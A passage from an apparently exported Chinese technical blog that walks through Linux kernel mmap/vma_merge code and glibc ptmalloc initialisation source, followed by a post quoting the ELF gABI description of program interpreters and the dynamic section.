*rb_parent = __rb_parent; return 0;&#125; 该函数做了两件事，第一件事是重新检查一遍即将分配的虚拟内存是否已经被使用，主要是其他进程可能在这期间分配了该虚拟内存，第二件事是确定即将插入红黑树中的位置，保存在prev、rb_link和rb_parent中。prev保存了虚拟内存结束地址小于即将分配的虚拟内存开始地址的红黑树节点，rb_link一般为null，rb_parent简单说就是保存了离即将分配的虚拟内存开始地址最近的红黑树节点。 再往下通过vma_merge函数查看是否有虚拟空间可以合并，如果有则合并并返回。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162struct vm_area_struct *vma_merge(struct mm_struct *mm, struct vm_area_struct *prev, unsigned long addr, unsigned long end, unsigned long vm_flags, struct anon_vma *anon_vma, struct file *file, pgoff_t pgoff, struct mempolicy *policy)&#123; pgoff_t pglen = (end - addr) &gt;&gt; PAGE_SHIFT; struct vm_area_struct *area, *next; int err; if (vm_flags &amp; VM_SPECIAL) return NULL; if (prev) next = prev-&gt;vm_next; else next = mm-&gt;mmap; area = next; if (next &amp;&amp; next-&gt;vm_end == end) next = next-&gt;vm_next; if (prev &amp;&amp; prev-&gt;vm_end == addr &amp;&amp; mpol_equal(vma_policy(prev), policy) &amp;&amp; can_vma_merge_after(prev, vm_flags, anon_vma, file, pgoff)) &#123; if (next &amp;&amp; end == next-&gt;vm_start &amp;&amp; mpol_equal(policy, vma_policy(next)) &amp;&amp; can_vma_merge_before(next, vm_flags, anon_vma, file, pgoff+pglen) &amp;&amp; is_mergeable_anon_vma(prev-&gt;anon_vma, next-&gt;anon_vma, NULL)) &#123; err = vma_adjust(prev, prev-&gt;vm_start, next-&gt;vm_end, prev-&gt;vm_pgoff, NULL); &#125; else err = vma_adjust(prev, prev-&gt;vm_start, end, prev-&gt;vm_pgoff, NULL); if (err) return NULL; khugepaged_enter_vma_merge(prev, vm_flags); return prev; &#125; if (next &amp;&amp; end == next-&gt;vm_start &amp;&amp; mpol_equal(policy, vma_policy(next)) &amp;&amp; can_vma_merge_before(next, vm_flags, anon_vma, file, pgoff+pglen)) &#123; if (prev &amp;&amp; addr &lt; prev-&gt;vm_end) err = vma_adjust(prev, prev-&gt;vm_start, addr, prev-&gt;vm_pgoff, NULL); else err = vma_adjust(area, addr, next-&gt;vm_end, next-&gt;vm_pgoff - pglen, NULL); if (err) return NULL; khugepaged_enter_vma_merge(area, vm_flags); return area; &#125; return NULL;&#125; 这里就不详细分析这个函数了，主要通过prev-&gt;vm_end == addr判断即将分配的虚拟内存能否往前合并，通过end == next-&gt;vm_start判断即将分配的虚拟内存能否往后合并。其中，合并函数为vma_adjust。再往下就不分析了。 回到函数中，假设不能合并，就要通过slab构造一个vm_area_struct结构体，并设置相应的信息，slab是linux内核中分配小块内存的框架。然后通过vma_link插入到进程的红黑树中， 1234567static void vma_link(struct mm_struct *mm, struct vm_area_struct *vma, struct vm_area_struct *prev, struct rb_node **rb_link, struct rb_node *rb_parent)&#123; __vma_link(mm, vma, prev, rb_link, rb_parent); mm-&gt;map_count++;&#125; __vma_link执行实际的插入操作，就是一些红黑树的操作，不往下看了。 回到mmap_region中，最后通过vma_set_page_prot继续设置一些标志位，然后就返回分配到的虚拟内存的起始地址addr了，该返回值一直向上返回，然后退出系统调用，返回到glibc中。到这里简单总结一下MMAP，其实质就是通过mmap在进程的内存管理结构中的红黑树中分配一块没有使用的虚拟内存。 下一章继续往下分析glibc中的_int_malloc函数。","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"malloc源码分析——1","date":"2018-05-21T06:35:24.000Z","path":"2018/05/21/malloc源码分析——1/","text":"malloc源码分析—ptmalloc_init本文分析malloc的源码，首先从glibc开始，首先看malloc.c文件中的一段定义， 1strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, malloc) strong_alias是GNU C中的定义，编译器判定这里malloc是__libc_malloc的别名，__libc_malloc定义在malloc.c中， 123456789101112131415161718192021222324void * __libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); if (!victim &amp;&amp; ar_ptr != NULL)&#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); return victim;&#125;libc_hidden_def (__libc_malloc) 首先看atomic_forced_read， 12# define atomic_forced_read(x) \\ (&#123; __typeof (x) __x; __asm (&quot;&quot; : &quot;=r&quot; (__x) : &quot;0&quot; (x)); __x; &#125;) __typeof是原始函数的返回类型，后面是一段汇编代码，”0”是零，即%0，引用时不可以加 %，只能input引用output，这里就是原子读，将__malloc_hook的地址放入任意寄存器(r)再取出。__malloc_hook的定义如下 1void *weak_variable (*__malloc_hook)(size_t __size, const void *) = malloc_hook_ini; weak_variable其实就是， 1__attribute__ ((weak)) 和编译器有关，这里不管它。__builtin_expect其实就是告诉编译器if判断语句里大多数情况下的值，这样编译器可以做优化，避免过多的跳转。回到__libc_malloc接下来就是调用malloc_hook_ini进行内存的分配。malloc_hook_ini定义在hooks.c中， 12345static void * malloc_hook_ini (size_t sz, const void *caller)&#123; __malloc_hook = NULL; ptmalloc_init (); return __libc_malloc (sz);&#125; ptmalloc_initptmalloc_init用来对整个ptmalloc框架进行初始化，定义在arena.c中， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970static void ptmalloc_init(void) &#123; if (__malloc_initialized &gt;= 0) return; __malloc_initialized = 0; tsd_key_create(&amp;arena_key, NULL); tsd_setspecific(arena_key, (void *) &amp;main_arena); thread_atfork(ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2); const char *s = NULL; if (__glibc_likely(_environ != NULL)) &#123; char **runp = _environ; char *envline; while (__builtin_expect((envline = next_env_entry(&amp;runp)) != NULL, 0)) &#123; size_t len = strcspn(envline, &quot;=&quot;); if (envline[len] != &apos;=&apos;) continue; switch (len) &#123; case 6: if (memcmp(envline, &quot;CHECK_&quot;, 6) == 0) s = &amp;envline[7]; break; case 8: if (!__builtin_expect(__libc_enable_secure, 0)) &#123; if (memcmp(envline, &quot;TOP_PAD_&quot;, 8) == 0) __libc_mallopt(M_TOP_PAD, atoi(&amp;envline[9])); else if (memcmp(envline, &quot;PERTURB_&quot;, 8) == 0) __libc_mallopt(M_PERTURB, atoi(&amp;envline[9])); &#125; break; case 9: if (!__builtin_expect(__libc_enable_secure, 0)) &#123; if (memcmp(envline, &quot;MMAP_MAX_&quot;, 9) == 0) __libc_mallopt(M_MMAP_MAX, atoi(&amp;envline[10])); else if (memcmp(envline, &quot;ARENA_MAX&quot;, 9) == 0) __libc_mallopt(M_ARENA_MAX, atoi(&amp;envline[10])); &#125; break; case 10: if (!__builtin_expect(__libc_enable_secure, 0)) &#123; if (memcmp(envline, &quot;ARENA_TEST&quot;, 10) == 0) __libc_mallopt(M_ARENA_TEST, atoi(&amp;envline[11])); &#125; break; case 15: if (!__builtin_expect(__libc_enable_secure, 0)) &#123; if (memcmp(envline, &quot;TRIM_THRESHOLD_&quot;, 15) == 0) __libc_mallopt(M_TRIM_THRESHOLD, atoi(&amp;envline[16])); else if (memcmp(envline, &quot;MMAP_THRESHOLD_&quot;, 15) == 0) __libc_mallopt(M_MMAP_THRESHOLD, atoi(&amp;envline[16])); &#125; break; default: break; &#125; &#125; &#125; if (s &amp;&amp; s[0]) &#123; __libc_mallopt(M_CHECK_ACTION, (int) (s[0] - &apos;0&apos;)); if (check_action != 0) __malloc_check_init(); &#125; void (*hook)(void) = atomic_forced_read (__malloc_initialize_hook); if (hook != NULL) (*hook)(); __malloc_initialized = 1;&#125; 首先检查全局变量__malloc_initialized是否大于等于0，如果该值大于0，表示ptmalloc已经初始化，如果改值为0，表示ptmalloc正在初始化，全局变量__malloc_initialized用来保证全局只初始化ptmalloc一次。tsd_key_create创建线程私有实例arena_key，该私有实例保存的是分配区（arena）的malloc_state实例指针。arena_key指向的可能是主分配区的指针，也可能是非主分配区的指针，这里将调用ptmalloc_init()的线程的arena_key绑定到主分配区上。意味着本线程首选从主分配区分配内存。arena_key在glibc中是一个线程私有变量， 123#define tsd_key_create(key, destr) ((void) (key))#define tsd_setspecific(key, data) __libc_tsd_set (void *, MALLOC, (data))#define __libc_tsd_set(TYPE, KEY, VALUE) (__libc_tsd_##KEY = (VALUE)) tsd_setspecific(arena_key, (void *) &amp;main_arena);就是__libc_tsd_MALLOC = &amp;main_arenathread_atfork用来设置进程在fork创建子进程时关于锁设置的各个函数，ptmalloc_lock_all和ptmalloc_unlock_all用来给父进程加锁解锁，ptmalloc_unlock_all2用来给子进程调用以解锁。 1234567# define thread_atfork(prepare, parent, child) \\ atfork_mem.prepare_handler = prepare; \\ atfork_mem.parent_handler = parent; \\ atfork_mem.child_handler = child; \\ atfork_mem.dso_handle = &amp;__dso_handle == NULL ? NULL : __dso_handle; \\ atfork_mem.refcntr = 1; \\ __linkin_atfork (&amp;atfork_mem) 其中，atfork_mem是一个全局的fork时的函数子针结构体fork_handler， 1#define ATFORK_MEM static struct fork_handler atfork_mem1 __linkin_atfork用于将刚刚构造的fork_handler添加进全局链表__fork_handlers中而不用加锁，其实就是一个CAS锁，关于该锁，可以查阅网上资料， 123456void attribute_hidden __linkin_atfork(struct fork_handler *newp) &#123; do newp-&gt;next = __fork_handlers; while (catomic_compare_and_exchange_bool_acq(&amp;__fork_handlers, newp, newp-&gt;next) != 0);&#125; catomic_compare_and_exchange_bool_acq最后是一个宏定义，将之改写后如下 1234567891011&#123; fork_handler* __atg4_old = newp-&gt;next; long __gmemp = &amp;__fork_handlers; ATOMIC(); fork_handler* __gret = *__gmemp; fork_handler* __gnewval = newp; if (__gret == __atg4_old) *__gmemp = newp; ENDATOMIC(); __gret; &#125; gcc会将这段代码进行编译，生成的代码无法被中断。因此简单说来，__linkin_atfork就是将fork_handler原子添加进全局链表__fork_handlers中。 回到ptmalloc_init函数中，接下来就是进行环境变量的设置，__glibc_likely和gcc的编译优化相关，不管他。_environ就是__environ，里面保存了环境变量，下面就是根据各个环境变量调用__libc_mallopt进行设置，后面来看这个函数。 ptmalloc_init然后获取__malloc_initialize_hook函数指针并执行，由于该函数和malloc没有直接关系，这里不管它。最后将__malloc_initialized设置为1，表是初始化完成。 __libc_mallopt__libc_mallopt定义在malloc.c中， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980int __libc_mallopt(int param_number, int value) &#123; mstate av = &amp;main_arena; int res = 1; if (__malloc_initialized &lt; 0) ptmalloc_init(); (void) mutex_lock(&amp;av-&gt;mutex); malloc_consolidate(av); LIBC_PROBE (memory_mallopt, 2, param_number, value); switch (param_number) &#123; case M_MXFAST: if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE) &#123; LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ()); set_max_fast(value); &#125; else res = 0; break; case M_TRIM_THRESHOLD: LIBC_PROBE (memory_mallopt_trim_threshold, 3, value, mp_.trim_threshold, mp_.no_dyn_threshold); mp_.trim_threshold = value; mp_.no_dyn_threshold = 1; break; case M_TOP_PAD: LIBC_PROBE (memory_mallopt_top_pad, 3, value, mp_.top_pad, mp_.no_dyn_threshold); mp_.top_pad = value; mp_.no_dyn_threshold = 1; break; case M_MMAP_THRESHOLD: if ((unsigned long) value &gt; HEAP_MAX_SIZE / 2) res = 0; else &#123; LIBC_PROBE (memory_mallopt_mmap_threshold, 3, value, mp_.mmap_threshold, mp_.no_dyn_threshold); mp_.mmap_threshold = value; mp_.no_dyn_threshold = 1; &#125; break; case M_MMAP_MAX: LIBC_PROBE (memory_mallopt_mmap_max, 3, value, mp_.n_mmaps_max, mp_.no_dyn_threshold); mp_.n_mmaps_max = value; mp_.no_dyn_threshold = 1; break; case M_CHECK_ACTION: LIBC_PROBE (memory_mallopt_check_action, 2, value, check_action); check_action = value; break; case M_PERTURB: LIBC_PROBE (memory_mallopt_perturb, 2, value, perturb_byte); perturb_byte = value; break; case M_ARENA_TEST: if (value &gt; 0) &#123; LIBC_PROBE (memory_mallopt_arena_test, 2, value, mp_.arena_test); mp_.arena_test = value; &#125; break; case M_ARENA_MAX: if (value &gt; 0) &#123; LIBC_PROBE (memory_mallopt_arena_max, 2, value, mp_.arena_max); mp_.arena_max = value; &#125; break; &#125; (void) mutex_unlock(&amp;av-&gt;mutex); return res;&#125;libc_hidden_def( __libc_mallopt) 首先通过__malloc_initialized判断如果ptmalloc还未初始化，就调用ptmalloc_init进行初始化。malloc_consolidate用来将fast bins中的chunk合并，并且里面会初始化主分配区，后面的章节会分析到这个函数。然后就根据传入的param_number设置mp_，mp_代表ptmalloc的各个全局参数，其默认定义如下 12345678static struct malloc_par mp_ = &#123; .top_pad = DEFAULT_TOP_PAD, .n_mmaps_max = DEFAULT_MMAP_MAX, .mmap_threshold = DEFAULT_MMAP_THRESHOLD, .trim_threshold = DEFAULT_TRIM_THRESHOLD,#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES(1) &#125;; 这里不分析里面各个参数的意义，到后面用到时再来分析。malloc_hook_ini最后会回调__libc_malloc函数，这次__malloc_hook为null，因此继续看下面的代码。 arena_get接下来通过arena_get获得一个分配区，arena_get是个宏定义，定义在arena.c中， 1234#define arena_get(ptr, size) do &#123; \\ arena_lookup (ptr); \\ arena_lock (ptr, size); \\ &#125; while (0) arena_lookup从私有变量里获取分配区指针， 1234#define arena_lookup(ptr) do &#123; \\ void *vptr = NULL; \\ ptr = (mstate) tsd_getspecific (arena_key, vptr); \\ &#125; while (0) tsd_getspecific也是个宏定义，就是获取前面调用tsd_setspecific设置的分配区指针，这里取出的可能是主分配去指针，也可能是非主分配去指针，然后调用arena_lock对malloc_state中的mutex加锁。 123456#define arena_lock(ptr, size) do &#123; \\ if (ptr &amp;&amp; !arena_is_corrupt (ptr)) \\ (void) mutex_lock (&amp;ptr-&gt;mutex); \\ else \\ ptr = arena_get2 (ptr, (size), NULL); \\ &#125; while (0) 获得分配去的指针后，就会调用_int_malloc开始分配内存了，下一章分析这个函数。","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"Dynamic Linking","date":"2018-04-20T14:26:26.000Z","path":"2018/04/20/Dynamic-Linking/","text":"本文参考http://www.sco.com/developers/gabi/latest/ch5.dynamic.html 程序解释器（Program Interpreter）可执行程序在动态链接的过程中会有 PT_INTERP 程序段。exec(BA_OS)过程中，系统通过PT_INTERP获取路径名并且创建最初的解释器解释的文件段镜像。这就是说，程序不使用可执行文件原始的段镜像，而是另外创建一块内存给解释器。然后，解释器获得程序的控制权并提供相应的运行环境。 解释器获得控制权有两种方式： 利用文件描述符去读取或者映射可执行文件的段到内存中。 系统依赖可执行文件的格式，加载可执行文件到内存 由于文件描述符可能存在异常，因此解释器的初始进程状态需要与可执行文件接收的内容相匹配。 解释器可以不需要另外的解释器来解释，也即可以自解释；解释器可以是共享对象或可执行文件。 共享对象：正常情况下是位置独立加载的，地址可能因进程而异; 系统会在mmap(KE_OS)和相关服务使用的动态段区域中创建段。因此，共享对象解释器通常不会与原始可执行文件的原始段地址冲突。 可执行文件：可能加载在固定地址处; 如果是这样，系统将使用程序头表中的虚拟地址创建其段。 因此，可执行文件解释器的虚拟地址可能与第一个可执行文件发生冲突; 解释器需要负责解决冲突。 动态链接器（Dynamic Linker）当动态链接编译可执行文件，链接器将会在程序头加入PT_INTERP，以告诉系统用动态链接器作为程序解释器。 提供动态连接器的系统位置是特定于处理器的。 exec(BA_OS)和动态链接共同创建了程序的过程映像，过程如下： 将可执行文件的内存段加入过程映像 将共享对象的内存段加入过程映像 对可执行文件及其共享对象执行重定向 如果文件描述符被交给动态链接器，就关闭用于读取可执行文件的文件描述符 Program InterpreterAn executable file that participates in dynamic linking shall have one PT_INTERP program header element. During exec(BA_OS), the system retrieves a path name from the PT_INTERP segment and creates the initial process image from the interpreter file&#39;s segments. That is, instead of using the original executable file&#39;s segment images, the system composes a memory image for the interpreter. It then is the interpreter&#39;s responsibility to receive control from the system and provide an environment for the application program. As &#39;&#39;Process Initialization&#39;&#39; in Chapter 3 of the processor supplement mentions, the interpreter receives control in one of two ways. First, it may receive a file descriptor to read the executable file, positioned at the beginning. It can use this file descriptor to read and/or map the executable file&#39;s segments into memory. Second, depending on the executable file format, the system may load the executable file into memory instead of giving the interpreter an open file descriptor. With the possible exception of the file descriptor, the interpreter&#39;s initial process state matches what the executable file would have received. The interpreter itself may not require a second interpreter. An interpreter may be either a shared object or an executable file. A shared object (the normal case) is loaded as position-independent, with addresses that may vary from one process to another; the system creates its segments in the dynamic segment area used by mmap(KE_OS) and related services [See Virtual Address Space&#39;&#39; in Chapter 3 of the processor supplement]. Consequently, a shared object interpreter typically will not conflict with the original executable file&#39;s original segment addresses. An executable file may be loaded at fixed addresses; if so, the system creates its segments using the virtual addresses from the program header table. Consequently, an executable file interpreter&#39;s virtual addresses may collide with the first executable file; the interpreter is responsible for resolving conflicts. Dynamic LinkerWhen building an executable file that uses dynamic linking, the link editor adds a program header element of type PT_INTERP to an executable file, telling the system to invoke the dynamic linker as the program interpreter. The locations of the system provided dynamic linkers are processor specific. Exec(BA_OS) and the dynamic linker cooperate to create the process image for the program, which entails the following actions: Adding the executable file&#39;s memory segments to the process image; Adding shared object memory segments to the process image; Performing relocations for the executable file and its shared objects; Closing the file descriptor that was used to read the executable file, if one was given to the dynamic linker; Transferring control to the program, making it look as if the program had received control directly fromexec(BA_OS). The link editor also constructs various data that assist the dynamic linker for executable and shared object files. As shown above in &#39;&#39;&#39;Program Header&#39;&#39;, this data resides in loadable segments, making them available during execution. (Once again, recall the exact segment contents are processor-specific. See the processor supplement for complete information). A .dynamicsection with type SHT_DYNAMICholds various data. The structure residing at the beginning of the section holds the addresses of other dynamic linking information. The .hashsection with type SHT_HASHholds a symbol hash table. The .got and .plt sections with type SHT_PROGBITS hold two separate tables: the global offset table and the procedure linkage table. Chapter 3 discusses how programs use the global offset table for position-independent code. Sections below explain how the dynamic linker uses and changes the tables to create memory images for object files. Because every ABI-conforming program imports the basic system services from a shared object library [See &#39;&#39;System Library&#39;&#39; in Chapter 6], the dynamic linker participates in every ABI-conforming program execution. As &#39;&#39;Program Loading&#39;&#39; explains in the processor supplement, shared objects may occupy virtual memory addresses that are different from the addresses recorded in the file&#39;s program header table. The dynamic linker relocates the memory image, updating absolute addresses before the application gains control. Although the absolute address values would be correct if the library were loaded at the addresses specified in the program header table, this normally is not the case. If the process environment [see exec(BA_OS)] contains a variable named LD_BIND_NOW with a non-null value, the dynamic linker processes all relocations before transferring control to the program. For example, all the following environment entries would specify this behavior. LD_BIND_NOW=1 LD_BIND_NOW=on LD_BIND_NOW=off Otherwise, LD_BIND_NOW either does not occur in the environment or has a null value. The dynamic linker is permitted to evaluate procedure linkage table entries lazily, thus avoiding symbol resolution and relocation overhead for functions that are not called. See &#39;&#39;Procedure Linkage Table&#39;&#39; in this chapter of the processor supplement for more information. Dynamic SectionIf an object file participates in dynamic linking, its program header table will have an element of typePT_DYNAMIC. This &#39;&#39;segment&#39;&#39; contains the .dynamic section. A special symbol, _DYNAMIC, labels the section, which contains an array of the following structures. Figure 5-9: Dynamic Structure 12345678910111213141516171819typedef struct &#123; Elf32_Sword d_tag; union &#123; Elf32_Word d_val; Elf32_Addr d_ptr; &#125; d_un;&#125; Elf32_Dyn;extern Elf32_Dyn _DYNAMIC[];typedef struct &#123; Elf64_Sxword d_tag; union &#123; Elf64_Xword d_val; Elf64_Addr d_ptr; &#125; d_un;&#125; Elf64_Dyn;extern Elf64_Dyn _DYNAMIC[]; For each object with this type, d_tag controls the interpretation of d_un. d_val These objects represent integer values with various interpretations. d_ptr These objects represent program virtual addresses. As mentioned previously, a file&#39;s virtual addresses might not match the memory virtual addresses during execution. When interpreting addresses contained in the dynamic structure, the dynamic linker computes actual addresses, based on the original file value and the memory base address. For consistency, files do not contain relocation entries to &quot; correct&#39;&#39; addresses in the dynamic structure. To make it simpler for tools to interpret the contents of dynamic section entries, the value of each tag, except for those in two special compatibility ranges, will determine the interpretation of the d_un union. A tag whose value is an even number indicates a dynamic section entry that uses d_ptr. A tag whose value is an odd number indicates a dynamic section entry that uses d_val or that uses neither d_ptr nor d_val. Tags whose values are less than the special value DT_ENCODING and tags whose values fall between DT_HIOS and DT_LOPROC do not follow these rules. The following table summarizes the tag requirements for executable and shared object files. If a tag is marked &quot;mandatory&#39;&#39;, the dynamic linking array for an ABI-conforming file must have an entry of that type. Likewise, &quot;optional&#39;&#39; means an entry for the tag may appear but is not required. Figure 5-10: Dynamic Array Tags d_tag Name Value d_un Executable Shared Object DT_NULL 0 ignored mandatory mandatory DT_NEEDED 1 d_val optional optional DT_PLTRELSZ 2 d_val optional optional DT_PLTGOT 3 d_ptr optional optional DT_HASH 4 d_ptr mandatory mandatory DT_STRTAB 5 d_ptr mandatory mandatory DT_SYMTAB 6 d_ptr mandatory mandatory DT_RELA 7 d_ptr mandatory optional DT_RELASZ 8 d_val mandatory optional DT_RELAENT 9 d_val mandatory optional DT_STRSZ 10 d_val mandatory mandatory DT_SYMENT 11 d_val mandatory mandatory DT_INIT 12 d_ptr optional optional DT_FINI 13 d_ptr optional optional DT_SONAME 14 d_val ignored optional DT_RPATH* 15 d_val optional ignored DT_SYMBOLIC* 16 ignored ignored optional DT_REL 17 d_ptr mandatory optional DT_RELSZ 18 d_val mandatory optional DT_RELENT 19 d_val mandatory optional DT_PLTREL 20 d_val optional optional DT_DEBUG 21 d_ptr optional ignored DT_TEXTREL* 22 ignored optional optional DT_JMPREL 23 d_ptr optional optional DT_BIND_NOW* 24 ignored optional optional DT_INIT_ARRAY 25 d_ptr optional optional DT_FINI_ARRAY 26 d_ptr optional optional DT_INIT_ARRAYSZ 27 d_val optional optional DT_FINI_ARRAYSZ 28 d_val optional optional DT_RUNPATH 29 d_val optional optional DT_FLAGS 30 d_val optional optional DT_ENCODING 32 unspecified unspecified unspecified DT_PREINIT_ARRAY 32 d_ptr optional ignored DT_PREINIT_ARRAYSZ 33 d_val optional ignored DT_SYMTAB_SHNDX 34 d_ptr optional optional DT_LOOS 0x6000000D unspecified unspecified unspecified DT_HIOS 0x6ffff000 unspecified unspecified unspecified DT_LOPROC 0x70000000 unspecified unspecified unspecified DT_HIPROC 0x7fffffff unspecified unspecified unspecified * Signifies an entry that is at level 2. DT_NULL An entry with a DT_NULL tag marks the end of the _DYNAMIC array. DT_NEEDED This element holds the string table offset of a null-terminated string, giving the name of a needed library. The offset is an index into the table recorded in the DT_STRTAB code. See &quot;Shared Object Dependencies&#39;&#39; for more information about these names. The dynamic array may contain multiple entries with this type. These entries&#39; relative order is significant, though their relation to entries of other types is not. DT_PLTRELSZ This element holds the total size, in bytes, of the relocation entries associated with the procedure linkage table. If an entry of type DT_JMPREL is present, a DT_PLTRELSZ must accompany it. DT_PLTGOT This element holds an address associated with the procedure linkage table and/or the global offset table. See this section in the processor supplement for details. DT_HASH This element holds the address of the symbol hash table, described in &quot;Hash Table&#39;&#39;. This hash table refers to the symbol table referenced by the DT_SYMTAB element. DT_STRTAB This element holds the address of the string table, described in Chapter 4. Symbol names, library names, and other strings reside in this table. DT_SYMTAB This element holds the address of the symbol table, described in the first part of this chapter, with Elf32_Sym entries for the 32-bit class of files and Elf64_Sym entries for the 64-bit class of files. DT_RELA This element holds the address of a relocation table, described in Chapter 4. Entries in the table have explicit addends, such as Elf32_Rela for the 32-bit file class or Elf64_Rela for the 64-bit file class. An object file may have multiple relocation sections. When building the relocation table for an executable or shared object file, the link editor catenates those sections to form a single table. Although the sections remain independent in the object file, the dynamic linker sees a single table. When the dynamic linker creates the process image for an executable file or adds a shared object to the process image, it reads the relocation table and performs the associated actions. If this element is present, the dynamic structure must also have DT_RELASZ and DT_RELAENT elements. When relocation is “mandatory&#39;&#39; for a file, either DT_RELA or DT_REL may occur (both are permitted but not required). DT_RELASZ This element holds the total size, in bytes, of the DT_RELA relocation table. DT_RELAENT This element holds the size, in bytes, of the DT_RELA relocation entry. DT_STRSZ This element holds the size, in bytes, of the string table. DT_SYMENT This element holds the size, in bytes, of a symbol table entry. DT_INIT This element holds the address of the initialization function, discussed in “Initialization and Termination Functions&#39;&#39; below. DT_FINI This element holds the address of the termination function, discussed in “Initialization and Termination Functions&#39;&#39; below. DT_SONAME This element holds the string table offset of a null-terminated string, giving the name of the shared object. The offset is an index into the table recorded in the DT_STRTAB entry. See “Shared Object Dependencies&#39;&#39; below for more information about these names. DT_RPATH This element holds the string table offset of a null-terminated search library search path string discussed in ”Shared Object Dependencies&#39;&#39;. The offset is an index into the table recorded in the DT_STRTAB entry. This entry is at level 2. Its use has been superseded by DT_RUNPATH. DT_SYMBOLIC This element&#39;s presence in a shared object library alters the dynamic linker&#39;s symbol resolution algorithm for references within the library. Instead of starting a symbol search with the executable file, the dynamic linker starts from the shared object itself. If the shared object fails to supply the referenced symbol, the dynamic linker then searches the executable file and other shared objects as usual. This entry is at level 2. Its use has been superseded by the DF_SYMBOLIC flag. DT_REL This element is similar to DT_RELA, except its table has implicit addends, such as Elf32_Rel for the 32-bit file class or Elf64_Rel for the 64-bit file class. If this element is present, the dynamic structure must also haveDT_RELSZ and DT_RELENT elements. DT_RELSZ This element holds the total size, in bytes, of the DT_REL relocation table. DT_RELENT This element holds the size, in bytes, of the DT_REL relocation entry. DT_PLTREL This member specifies the type of relocation entry to which the procedure linkage table refers. The d_valmember holds DT_REL or DT_RELA, as appropriate. All relocations in a procedure linkage table must use the same relocation. DT_DEBUG This member is used for debugging. Its contents are not specified for the ABI; programs that access this entry are not ABI-conforming. DT_TEXTREL This member&#39;s absence signifies that no relocation entry should cause a modification to a non-writable segment, as specified by the segment permissions in the program header table. If this member is present, one or more relocation entries might request modifications to a non-writable segment, and the dynamic linker can prepare accordingly. This entry is at level 2. Its use has been superseded by the DF_TEXTREL flag. DT_JMPREL If present, this entry&#39;s d_ptr member holds the address of relocation entries associated solely with the procedure linkage table. Separating these relocation entries lets the dynamic linker ignore them during process initialization, if lazy binding is enabled. If this entry is present, the related entries of typesDT_PLTRELSZ and DT_PLTREL must also be present. DT_BIND_NOW If present in a shared object or executable, this entry instructs the dynamic linker to process all relocations for the object containing this entry before transferring control to the program. The presence of this entry takes precedence over a directive to use lazy binding for this object when specified through the environment or via dlopen(BA_LIB). This entry is at level 2. Its use has been superseded by the DF_BIND_NOW flag. DT_INIT_ARRAY This element holds the address of the array of pointers to initialization functions, discussed inInitialization and Termination Functions&#39;&#39; below. DT_FINI_ARRAY This element holds the address of the array of pointers to termination functions, discussed inInitialization and Termination Functions&#39;&#39; below. DT_INIT_ARRAYSZ This element holds the size in bytes of the array of initialization functions pointed to by the DT_INIT_ARRAYentry. If an object has a DT_INIT_ARRAY entry, it must also have a DT_INIT_ARRAYSZ entry. DT_FINI_ARRAYSZ This element holds the size in bytes of the array of termination functions pointed to by the DT_FINI_ARRAYentry. If an object has a DT_FINI_ARRAY entry, it must also have a DT_FINI_ARRAYSZ entry. DT_RUNPATH This element holds the string table offset of a null-terminated library search path string discussed in ”Shared Object Dependencies&#39;&#39;. The offset is an index into the table recorded in the DT_STRTAB entry. DT_FLAGS This element holds flag values specific to the object being loaded. Each flag value will have the name DF_flag_name. Defined values and their meanings are described below. All other values are reserved. DT_PREINIT_ARRAY This element holds the address of the array of pointers to pre-initialization functions, discussed in “Initialization and Termination Functions&#39;&#39; below. The DT_PREINIT_ARRAY table is processed only in an executable file; it is ignored if contained in a shared object. DT_PREINIT_ARRAYSZ This element holds the size in bytes of the array of pre-initialization functions pointed to by the DT_PREINIT_ARRAY entry. If an object has a DT_PREINIT_ARRAY entry, it must also have a DT_PREINIT_ARRAYSZ entry. As with DT_PREINIT_ARRAY, this entry is ignored if it appears in a shared object. DT_SYMTAB_SHNDX This element holds the address of the SHT_SYMTAB_SHNDX section associated with the dynamic symbol table referenced by the DT_SYMTAB element. DT_ENCODING Values greater than or equal to DT_ENCODING and less than DT_LOOS follow the rules for the interpretation of the d_un union described above. DT_LOOS through DT_HIOS Values in this inclusive range are reserved for operating system-specific semantics. All such values follow the rules for the interpretation of the d_un union described above. DT_LOPROC through DT_HIPROC Values in this inclusive range are reserved for processor-specific semantics. If meanings are specified, the processor supplement explains them. All such values follow the rules for the interpretation of the d_ununion described above. Except for the DT_NULL element at the end of the array, and the relative order of DT_NEEDED elements, entries may appear in any order. Tag values not appearing in the table are reserved. Figure 5-11: DT_FLAGS values Name Value DF_ORIGIN 0x1 DF_SYMBOLIC 0x2 DF_TEXTREL 0x4 DF_BIND_NOW 0x8 DF_STATIC_TLS 0x10 DF_ORIGIN This flag signifies that the object being loaded may make reference to the $ORIGIN substitution string (see &quot;Substitution Sequences&#39;&#39;). The dynamic linker must determine the pathname of the object containing this entry when the object is loaded. DF_SYMBOLIC If this flag is set in a shared object library, the dynamic linker&#39;s symbol resolution algorithm for references within the library is changed. Instead of starting a symbol search with the executable file, the dynamic linker starts from the shared object itself. If the shared object fails to supply the referenced symbol, the dynamic linker then searches the executable file and other shared objects as usual. DF_TEXTREL If this flag is not set, no relocation entry should cause a modification to a non-writable segment, as specified by the segment permissions in the program header table. If this flag is set, one or more relocation entries might request modifications to a non-writable segment, and the dynamic linker can prepare accordingly. DF_BIND_NOW If set in a shared object or executable, this flag instructs the dynamic linker to process all relocations for the 